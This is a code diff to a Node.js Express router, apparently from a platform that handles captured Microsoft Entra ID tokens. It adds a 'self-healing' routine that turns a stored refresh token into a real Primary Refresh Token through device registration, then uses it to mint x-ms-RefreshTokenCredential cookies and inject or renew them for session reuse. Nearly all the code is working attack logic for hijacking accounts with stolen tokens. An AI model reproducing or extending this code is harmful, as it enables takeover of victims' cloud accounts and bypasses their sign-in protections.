@@ -234,13 +234,16 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     // purpose: they are different methods and are not what GraphSpy uses.
     const prtkdf = require('../services/prtkdf');
 
-    const prt = safeDecrypt(token.prt) || safeDecrypt(token.refresh_token_encrypted);
-    if (!prt) {
+    // Never mint a KDF cookie from a plain refresh token: resolve a real
+    // PRT, self-healing via request_for_device when a device is registered.
+    const prtResolution = await resolveRealPrt(token);
+    if (!prtResolution.prt) {
       return res.status(409).json({
         success: false,
-        error: 'No PRT available for this token. Capture a PRT first (POST /:id/prt-capture).'
+        error: prtResolution.error || 'No PRT available for this token. Capture a PRT first (POST /:id/prt-capture).'
       });
     }
+    const prt = prtResolution.prt;
 
     const materials = await resolveSessionKeyForToken(token);
     if (!materials.hasSessionKey) {
@@ -504,8 +507,12 @@ router.post('/:id/renew', userAuth, async (req, res) => {
 
         // Use stored client_id if available, otherwise fall back to env
         const tokenClientId = token.client_id || config.AZURE_CLIENT_ID;
+        // Pass user_id (and the real email) so the KDF PRT cookie can be
+        // built from device_credentials.session_key_encrypted - without
+        // user_id the session-key lookup is skipped and renewals silently
+        // lose the x-ms-RefreshTokenCredential cookie.
         const result = await cookieConverter.convertTokensToCookies(
-          refreshToken, templateType, tokenTenant, null, token.account_type || 'unknown'
+          refreshToken, templateType, tokenTenant, token.email || null, token.account_type || 'unknown', req.user.id
         );
 
         if (result.success && result.cookies) {
@@ -551,10 +558,11 @@ router.post('/:id/renew', userAuth, async (req, res) => {
 
     // Fallback: For cookie-mode tokens without valid link_id, try direct refresh token exchange
     if (!token.link_id || token.token_type === 'cookie') {
-      // Use the cookie converter as fallback
+      // Use the cookie converter as fallback (user_id passed so the KDF PRT
+      // cookie can use the stored session key).
       const cookieConverter = require('../services/cookieconverter');
       const cookieResult = await cookieConverter.convertTokensToCookies(
-        refreshToken || accessToken, 'office', token.tenant || 'common', null, token.account_type || 'unknown'
+        refreshToken || accessToken, 'office', token.tenant || 'common', token.email || null, token.account_type || 'unknown', req.user.id
       );
 
       if (cookieResult.success && cookieResult.cookies) {
@@ -702,10 +710,13 @@ router.get('/prt-inject', userAuth, async (req, res) => {
     const token = tokens[0];
     const prtkdf = require('../services/prtkdf');
 
-    const prt = safeDecrypt(token.prt) || safeDecrypt(token.refresh_token_encrypted);
-    if (!prt) {
-      return res.status(400).json({ error: 'No PRT available for this token' });
+    // Never mint a KDF cookie from a plain refresh token: resolve a real
+    // PRT, self-healing via request_for_device when a device is registered.
+    const prtResolution = await resolveRealPrt(token);
+    if (!prtResolution.prt) {
+      return res.status(400).json({ error: prtResolution.error || 'No PRT available for this token' });
     }
+    const prt = prtResolution.prt;
 
     const materials = await resolveSessionKeyForToken(token);
     if (!materials.hasSessionKey) {
@@ -1115,6 +1126,58 @@ async function resolveSessionKeyForToken(token) {
   return { tenant: candidates[0] || 'common', hasSessionKey: false, sessionKey: null };
 }
 
+/**
+ * Resolve a REAL PRT for a token row, self-healing when the stored prt
+ * column still holds the plain refresh token (capture stores the raw RT
+ * there for work/school accounts).
+ *
+ * GraphSpy only mints KDF cookies from a real PRT (a JWT carrying PRT
+ * claims - tid/uid/oid/acrs/session_key/client_info). A plain OAuth refresh
+ * token (opaque v1 or "M." v2) must never be used as the refresh_token claim
+ * of x-ms-RefreshTokenCredential: Entra rejects such cookies. When no real
+ * PRT is stored but a device is registered, re-run GraphSpy's device-signed
+ * request_for_device (Slice C) and store the fresh PRT + session_key_jwe -
+ * exactly what POST /:id/prt-capture does.
+ *
+ * @returns {Promise<{prt: string|null, refreshed?: boolean, error?: string, tenant?: string}>}
+ */
+async function resolveRealPrt(token) {
+  const storedPrt = safeDecrypt(token.prt);
+  if (storedPrt && kerberosService.isValidPrtJwt(storedPrt)) {
+    return { prt: storedPrt, refreshed: false };
+  }
+  const refreshOrPrt = safeDecrypt(token.refresh_token_encrypted);
+  if (refreshOrPrt && kerberosService.isValidPrtJwt(refreshOrPrt)) {
+    return { prt: refreshOrPrt, refreshed: false };
+  }
+  if (!refreshOrPrt) {
+    return { prt: null, error: 'No refresh token stored for this token row - nothing to capture a PRT from.' };
+  }
+  const deviceManager = require('../services/devicemanager');
+  const candidates = [token.device_tenant_id, token.tenant].filter(Boolean);
+  for (const tenant of candidates) {
+    try {
+      const result = await deviceManager.capturePrtSessionKey(token.user_id, tenant, refreshOrPrt);
+      try {
+        await db.query(
+          'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ? AND user_id = ?',
+          [encrypt(result.prt), encrypt(result.sessionKeyJwe || null), token.id, token.user_id]
+        );
+      } catch (pErr) {
+        console.error('[Tokens] Failed to persist self-healed PRT:', pErr.message);
+      }
+      console.log('[Tokens] PRT self-heal: captured fresh PRT for token', token.id, 'tenant', tenant);
+      return { prt: result.prt, refreshed: true, tenant };
+    } catch (err) {
+      console.warn('[Tokens] PRT self-heal failed for tenant', tenant, ':', err.message);
+    }
+  }
+  return {
+    prt: null,
+    error: 'No real PRT stored and no registered device available to capture one. Run the device flow, or POST /:id/prt-capture first.'
+  };
+}
+
 // Slice C — POST /:id/prt-capture
 router.post('/:id/prt-capture', userAuth, async (req, res) => {
   try {
@@ -1192,11 +1255,12 @@ router.post('/:id/prt-cookie', userAuth, async (req, res) => {
     const token = await loadTokenRow(req, res);
     if (!token) return;
     const prtkdf = require('../services/prtkdf');
-    const prt = safeDecrypt(token.prt);
+    const prtResolution = await resolveRealPrt(token);
     const materials = await resolveSessionKeyForToken(token);
-    if (!prt) {
-      return res.status(409).json({ success: false, error: 'No PRT stored for this token. POST /:id/prt-capture first.' });
+    if (!prtResolution.prt) {
+      return res.status(409).json({ success: false, error: prtResolution.error || 'No PRT stored for this token. POST /:id/prt-capture first.' });
     }
+    const prt = prtResolution.prt;
     if (!materials.hasSessionKey) {
       return res.status(409).json({ success: false, error: 'No PRT session key stored for this user+tenant. POST /:id/prt-capture first.' });
     }
@@ -1228,11 +1292,12 @@ router.post('/:id/prt-token', userAuth, async (req, res) => {
     const token = await loadTokenRow(req, res);
     if (!token) return;
     const prtkdf = require('../services/prtkdf');
-    const prt = safeDecrypt(token.prt);
+    const prtResolution = await resolveRealPrt(token);
     const materials = await resolveSessionKeyForToken(token);
-    if (!prt) {
-      return res.status(409).json({ success: false, error: 'No PRT stored for this token. POST /:id/prt-capture first.' });
+    if (!prtResolution.prt) {
+      return res.status(409).json({ success: false, error: prtResolution.error || 'No PRT stored for this token. POST /:id/prt-capture first.' });
     }
+    const prt = prtResolution.prt;
     if (!materials.hasSessionKey) {
       return res.status(409).json({ success: false, error: 'No PRT session key stored for this user+tenant. POST /:id/prt-capture first.' });
     }
